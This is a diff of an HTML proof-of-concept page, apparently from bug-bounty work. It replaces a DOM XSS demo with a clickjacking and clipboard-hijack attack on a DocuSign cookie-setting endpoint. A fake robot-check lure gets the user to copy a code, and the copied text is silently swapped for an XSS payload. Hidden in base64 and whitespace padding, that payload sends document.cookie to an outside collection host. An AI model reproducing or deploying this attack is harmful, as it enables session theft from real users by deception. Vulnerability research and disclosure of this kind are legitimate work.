@@ -1,91 +1,50 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DOM XSS PoC</title>
-</head>
-<body>
-    <h1>DOM XSS Proof of Concept</h1>
-    <button onclick="injectMaliciousConfig()">Inject Malicious Config</button>
-    <button onclick="simulateVulnerablePage()">Simulate Vulnerable Page</button>
 
-    <div id="saved-configs"></div>
-    <p id="no-saved-configs-msg">No saved configurations available.</p>
 
-    <script>
-        function injectMaliciousConfig() {
-            // Define a malicious config object with XSS payload
-            let maliciousConfig = {
-                // Benign config entry for comparison
-                "safeEntry": {
-                    "email": "user@example.com",
-                    "envType": "production",
-                    "env": "safeEnv",
-                    "standardPass": false
-                },
-                // Malicious entry with XSS payload in configName
-                '"><img src=x onerror=alert("XSS Vulnerability!")>': {
-                    "email": "attacker@example.com",
-                    "envType": "testing",
-                    "env": "maliciousEnv",
-                    "standardPass": false
-                }
-            };
-
-            // Store the malicious config in localStorage
-            localStorage.setItem("martiniConfigs", JSON.stringify(maliciousConfig));
-            alert("Malicious config injected into localStorage. Click 'Simulate Vulnerable Page' to test.");
+<html><head>
+    <style>
+      :root {
+        --text-color-light: #000; /* Black text for light mode */
+        --bg-color-light: #fff; /* White background for light mode */
+        --text-color-dark: #fff; /* White text for dark mode */
+        --bg-color-dark: #121212; /* Dark background for dark mode */
+      }
+        body {
+          background-color: var(--bg-color-dark);
+          color: var(--text-color-dark);
         }
-
-        function simulateVulnerablePage() {
-            // Function simulating the vulnerable code, including createQuickButtons()
-
-            function getConfig() {
-                return JSON.parse(localStorage.getItem("martiniConfigs")) || {};
+      
+      #drag {
+                user-select: text; /* Allow text selection */
             }
+    
+    </style>
+    </head>
+    <body>
+      <center><div id='drag' ><h3>Please verify that you're not a robot by copying the code AB2x7E and pasting it into the box that will appear after a few seconds and click on set cookie to save.</h3><div qjid="quickjack" style="overflow: hidden; width: 221px; height: 42px; position: relative;" id="cksl6">
+        <iframe name="cksl7" src="https://partner.docusign.net/partners/msword/ribbon/setcookie" style="border: 0pt none ; left: 0px; top: -51px; position: absolute; width: 1920px; height: 919px;" scrolling="no"></iframe></div><br>
+    
+      <script>
+    
+    var xss = `QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<img src=x onerror=eval(atob(\`dmFyIGltZyA9IG5ldyBJbWFnZSgpO2ltZy5zcmMgPSAnaHR0cHM6Ly90aGJha3p0bWlnbnRmdHFqc2JhaDRtMTd5Z2FmdGU2eTMub2FzdC5mdW4vY29sbGVjdD9jb29raWVzPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKTsg\`))>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              AB2x7E`;
+    
+    window.addEventListener("message",function(e){
+        document.getElementsByTagName('iframe')[0].style="";
+    })
+    
+    document.onreadystatechange = () => {
+      if (document.readyState === 'complete') {
+        var x = document.getElementById("drag");
+     
 
-            function createQuickButtons() {
-                var configs = getConfig();
-                var container = document.getElementById("saved-configs");
-                container.innerHTML = ""; // Clear previous content
-                var hasConfigs = false;
-
-                // Generate buttons based on config names
-                for (var configName in configs) {
-                    var btn = document.createElement("div");
-                    btn.innerHTML = `
-                        <article class="card pointer" onclick="fillForm('${configName}')">
-                            <section class="card_content card_content-compressed l-flex-between">
-                                <div>
-                                    <strong class="card_title" title="This is a Title">${configName}</strong>
-                                </div>
-                                <div>
-                                    <button type="button" class="btn btn-minor" title="Edit" onclick="fillForm('${configName}', true); event.stopPropagation()">Edit</button>
-                                    <button type="button" class="btn btn-icon btn-minor" title="Delete" onclick="removeConfiguration('${configName}'); event.stopPropagation()">
-                                        <i class="icon icon-trash"></i>
-                                        <span class="vh">Delete</span>
-                                    </button>
-                                </div>
-                            </section>
-                        </article>
-                    `;
-                    container.appendChild(btn);
-                    hasConfigs = true;
-                }
-
-                var zeroStateEl = document.getElementById("no-saved-configs-msg");
-                if (zeroStateEl && hasConfigs) {
-                    zeroStateEl.classList.add("u-display-none");
-                } else if (zeroStateEl) {
-                    zeroStateEl.classList.remove("u-display-none");
-                }
-            }
-
-            // Call the vulnerable function
-            createQuickButtons();
-        }
+    
+    x.addEventListener('copy', (event) => {
+                const selection = window.getSelection();
+                    event.clipboardData.setData('text/plain', xss);
+                    event.preventDefault();
+            });
+    
+      }
+    };
     </script>
-</body>
-</html>
+    
+    </html>
